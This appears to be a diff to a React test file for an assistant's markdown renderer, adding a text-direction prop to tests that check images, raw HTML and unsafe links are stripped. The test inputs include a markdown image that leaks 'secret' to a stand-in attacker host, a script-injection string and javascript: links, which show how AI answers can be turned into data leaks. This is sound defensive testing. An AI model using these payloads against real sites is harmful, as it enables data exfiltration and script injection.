@@ -9,14 +9,17 @@ import { AssistantMarkdown } from './assistant-markdown';
 describe('AssistantMarkdown', () => {
   it('never renders an image, so an answer cannot make the browser fetch a URL', () => {
     const { container } = render(
-      <AssistantMarkdown text={'Look: ![x](https://evil.example/leak?q=secret) done'} />,
+      <AssistantMarkdown dir="ltr" text={'Look: ![x](https://evil.example/leak?q=secret) done'} />,
     );
     expect(container.querySelector('img')).toBeNull();
   });
 
   it('drops raw HTML instead of rendering it', () => {
     const { container } = render(
-      <AssistantMarkdown text={'<img src="https://evil.example/x"><script>alert(1)</script>Hi'} />,
+      <AssistantMarkdown
+        dir="ltr"
+        text={'<img src="https://evil.example/x"><script>alert(1)</script>Hi'}
+      />,
     );
     expect(container.querySelector('img, script')).toBeNull();
   });
@@ -24,6 +27,7 @@ describe('AssistantMarkdown', () => {
   it('turns only allowed portal pages into links', () => {
     const { container } = render(
       <AssistantMarkdown
+        dir="ltr"
         text={
           '[Open Deposit](/deposit) [History](/deposit?tab=history) ' +
           '[Phish](https://evil.example) [Proto](//evil.example) [JS](javascript:alert(1)) ' +
